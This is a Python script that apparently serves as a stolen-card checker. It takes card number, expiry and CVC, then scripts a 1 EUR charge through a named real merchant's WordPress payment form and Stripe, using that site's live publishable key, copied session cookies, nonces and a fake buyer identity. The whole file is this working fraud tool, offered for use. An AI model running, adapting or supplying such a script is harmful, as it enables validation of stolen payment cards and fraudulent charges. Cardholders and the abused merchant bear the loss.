import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	cookies = {
	    'asp_transient_id': '9284bbc9c0782e40d96c489083ff0bdf',
	    '_ga_YB7GN0XGNN': 'GS1.1.1741674170.1.0.1741674170.0.0.0',
	    '_ga': 'GA1.1.563523735.1741674171',
	    '__stripe_mid': 'bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac',
	    '__stripe_sid': 'befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
	}
	
	headers = {
	    'authority': 'www.bba-girona.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'asp_transient_id=9284bbc9c0782e40d96c489083ff0bdf; _ga_YB7GN0XGNN=GS1.1.1741674170.1.0.1741674170.0.0.0; _ga=GA1.1.563523735.1741674171; __stripe_mid=bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac; __stripe_sid=befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
	    'origin': 'https://www.bba-girona.com',
	    'referer': 'https://www.bba-girona.com/asp-payment-box/?product_id=593',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'action=asp_pp_create_pi&nonce=ed6318a4f6&amount=100&curr=EUR&product_id=593&quantity=1&billing_details={"name":"Rodam%20User%20","email":"rodamuser20%40gmail.com"}&token=d2f8760003e56bbc476efc989a4b6fda&customer_details={"name":"Rodam%20User%20","firstName":"Rodam%20User","lastName":"","email":"rodamuser20%40gmail.com"}'
	
	r1 = requests.post('https://www.bba-girona.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	pi = r1.json()['pi_id']
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'card[name]=Rodam+User+&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F56a6ae254e%3B+stripe-js-v3%2F56a6ae254e%3B+card-element&key=pk_live_51Mk2GiCM87UYzkWxgwx5Ve8YEMwZOmdgADBlvgwWT0MQ7ThYiPYJFzjoKrCBRGUZwwqkbTOHNB0Qid4VFvVRYncf00MvIVFrE4&_stripe_version=2024-12-18.acacia'
	
	r2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	tok = r2.json()['id']
	
	cookies = {
	    'asp_transient_id': '9284bbc9c0782e40d96c489083ff0bdf',
	    '_ga_YB7GN0XGNN': 'GS1.1.1741674170.1.0.1741674170.0.0.0',
	    '_ga': 'GA1.1.563523735.1741674171',
	    '__stripe_mid': 'bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac',
	    '__stripe_sid': 'befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
	}
	
	headers = {
	    'authority': 'www.bba-girona.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'asp_transient_id=9284bbc9c0782e40d96c489083ff0bdf; _ga_YB7GN0XGNN=GS1.1.1741674170.1.0.1741674170.0.0.0; _ga=GA1.1.563523735.1741674171; __stripe_mid=bb6a6576-ad5a-48ca-9402-3dc6a0955d7c55cfac; __stripe_sid=befe2b9a-c4e1-4b77-a1d1-fbb4925146e11cf4fe',
	    'origin': 'https://www.bba-girona.com',
	    'referer': 'https://www.bba-girona.com/asp-payment-box/?product_id=593',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'action=asp_pp_confirm_pi&nonce=abbbb23288&product_id=593&pi_id='+str(pi)+'&token=d2f8760003e56bbc476efc989a4b6fda&opts={"save_payment_method":true,"setup_future_usage":"off_session","receipt_email":"rodamuser20%40gmail.com","payment_method_data":{"type":"card","card":{"token":"'+str(tok)+'"}}}'
	
	r3 = requests.post('https://www.bba-girona.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r3.json())
